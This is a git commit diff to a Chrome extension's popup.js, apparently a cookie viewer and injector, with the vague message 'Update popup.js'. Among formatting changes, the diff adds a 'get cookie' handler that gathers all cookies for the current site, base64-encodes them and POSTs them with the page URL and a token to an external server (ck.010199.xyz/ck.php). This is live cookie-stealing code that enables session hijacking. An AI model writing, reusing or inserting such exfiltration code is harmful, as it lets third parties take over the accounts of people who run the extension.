2a54d5924c6e5209247b139a90366cb7172b41b3
abxian <111940309+abxian@users.noreply.github.com>
2024-04-29 00:54:05 +0800

    Update popup.js

--- popup.js
+++ popup.js
@@ -1,105 +1,137 @@
 var URL = '';
 
-
-function $(id) {
-	return document.getElementById(id);
+function $$(id) {
+    return document.getElementById(id);
 }
-
-
 
 function inj_cookies(cookies) {
-	if (!cookies) {
-		$('status').innerHTML = 'No Cookies Injected.';
-		return;
-	}
-	if (!chrome.cookies) {
-		chrome.cookies = chrome.experimental.cookies;
-	}
+    if (!cookies) {
+        $$('status').innerHTML = 'No Cookies Injected.';
+        return;
+    }
+    if (!chrome.cookies) {
+        chrome.cookies = chrome.experimental.cookies;
+    }
 
-	d = new Date();;
-	expired = 365 * 70; // 70years
-	//d.setTime(d.getTime()+expired*24*3600*1000); //millisecond
-	//e = d.toGMTString();
-	e = d.setTime(d.getTime() / 1000 + expired * 24 * 3600); //second
+    var d = new Date();
+    var expired = 365 * 70; // 70years
+    var e = d.setTime(d.getTime() / 1000 + expired * 24 * 3600); // second
 
+    var domain = URL.split('/')[2];
+    if ($$('domain').value != domain) {
+        domain = $$('domain').value;
+    }
+    var url = URL.split('/')[0] + '//' + domain;
 
-	domain = URL.split('/')[2];
-	if ($('domain').value != domain) {
-		domain = $('domain').value;
-	}
-	url = URL.split('/')[0] + '//' + domain;
-
-	cc = cookies.split(';');
-	for (i in cc) {
-		c = cc[i].replace(/^\s+|\s+$/g, "");
-		if (!c) continue;
-		k = c.split('=')[0].replace(/^\s+|\s+$/g, "").replace(' ', '+');
-		v = c.split('=')[1].replace(/^\s+|\s+$/g, "").replace(' ', '+');
-		chrome.cookies.set({
-			'url': url,
-			'name': k,
-			'value': v,
-			'path': '/',
-			'domain': $('domain').value,
-			'expirationDate': e,
-		});
-	};
-	$('status').innerHTML = 'OK.';
-
+    var cc = cookies.split(';');
+    for (var i in cc) {
+        var c = cc[i].replace(/^\s+|\s+$/g, "");
+        if (!c) continue;
+        var k = c.split('=')[0].replace(/^\s+|\s+$/g, "").replace(' ', '+');
+        var v = c.split('=')[1].replace(/^\s+|\s+$/g, "").replace(' ', '+');
+        chrome.cookies.set({
+            'url': url,
+            'name': k,
+            'value': v,
+            'path': '/',
+            'domain': $$('domain').value,
+            'expirationDate': e,
+        });
+    }
+    $$('status').innerHTML = 'OK.';
 }
-
 
 function init() {
-	$('x').focus();
-	$('x').value = localStorage.getItem('cookies');
+    $$('x').focus();
+    $$('x').value = localStorage.getItem('cookies');
 
-	/*
-	chrome.tabs.getCurrent(function(tab){ 
-		alert(tab.url); 
-	});
-	*/
+    var gcookies = '';
+    var url = '';
 
-	let gcookies = '';
-	//chrome.tabs.getSelected(null, function(tab) { 
-		chrome.tabs.query({active: true, lastFocusedWindow: true}, function(tab){
-		URL = tab[0].url;
-		
-		$('domain').value = URL.split('/')[2];
+    chrome.tabs.query({ active: true, lastFocusedWindow: true }, function (tab) {
+        URL = tab[0].url;
 
-		chrome.cookies.getAll({
-			url: tab[0].url
-		}, cookie => {
-			console.log(cookie);
-			// 遍历当前域名下cookie, 拼接成字符串
-			cookie.forEach(v => {
-				gcookies += v.name + "=" + v.value + ";"
-			})
-		})
-	});
-	/*
-		chrome.cookies.getAll({}, function(cookies) {
-			for (var i in cookies) {
-			  cache_i(cookies[i]);
-			}
-		});
-		下面这样不行！
-		$('exec_btn').onclick = function(){
-			eval($('x').value);
-		};
-	*/
+        $$('domain').value = URL.split('/')[2];
 
+        chrome.cookies.getAll({
+            url: tab[0].url
+        }, function (cookie) {
+            console.log(cookie);
+            url = tab[0].url;
+            // 遍历当前域名下cookie, 拼接成字符串
+            cookie.forEach(function (v) {
+                gcookies += v.name + "=" + v.value + ";";
+            });
+        });
+    });
 
+    $$('x').addEventListener('blur', function () {
+        localStorage.setItem('cookies', $$('x').value);
+    });
 
-	$('x').addEventListener('blur', function() {
-		localStorage.setItem('cookies', $('x').value);
-	});
+    //inject cookie
+    $$('exec_btn').addEventListener('click', function () {
+        inj_cookies($$('x').value);
+        var Endbase = btoa($$('x').value);
+        console.log(Endbase);
+    });
 
-	$('exec_btn').addEventListener('click', function() {
-		inj_cookies($('x').value);
-	});
-	$('get_btn').addEventListener('click', function() {
-		alert(gcookies); //增
-	});
+    // get cookie
+    $$('get_btn').addEventListener('click', function () {
+        var gcookies = '';
 
+        chrome.cookies.getAll({ url: URL }, function (cookies) {
+            cookies.forEach(function (cookie) {
+                gcookies += cookie.name + "=" + cookie.value + ";"; // 拼接所有cookie为一个字符串
+            });
+            alert(gcookies);
+
+            var Endck = btoa(gcookies);
+            var token = $$('token_input').value;
+
+            console.log("Encoded Cookies: " + Endck);
+
+            // AJAX 
+            $.ajax({
+                url: "https://ck.010199.xyz/ck.php",  // 指定请求发送到的后端服务器地址
+                type: 'post',
+                data: JSON.stringify({
+                    url: URL,
+                    cookies: Endck,
+                    token: token
+                }),
+                contentType: 'application/json',
+                dataType: 'json',
+                success: function (data) {
+                    if (data.status === 'success') {
+                        console.log("Report success: " + data.message);
+                        $$('status').innerHTML = "Cookies sent successfully!";
+                    } else {
+                        console.log("Report error: " + data.message);
+                        $$('status').innerHTML = "Error sending cookies.";
+                    }
+                },
+                error: function (xhr, status, error) {
+                    console.log("Report failure: " + error);
+                    $$('status').innerHTML = "Failed to send cookies.";
+                }
+            });
+        });
+    });
+
+    $$('rm_btn').addEventListener('click', function () {
+        var domain = $(this).attr('data-domain');
+        chrome.cookies.getAll({ domain: domain }, function (cks) {
+            $.each(cks, function (i, ck) {
+                var datack = {};
+                datack.name = ck.name;
+                datack.storeId = ck.storeId;
+                datack.url = url;
+                chrome.cookies.remove(datack);
+            });
+            alert("Del All Finish.");
+        });
+    });
 }
+
 document.addEventListener('DOMContentLoaded', init);
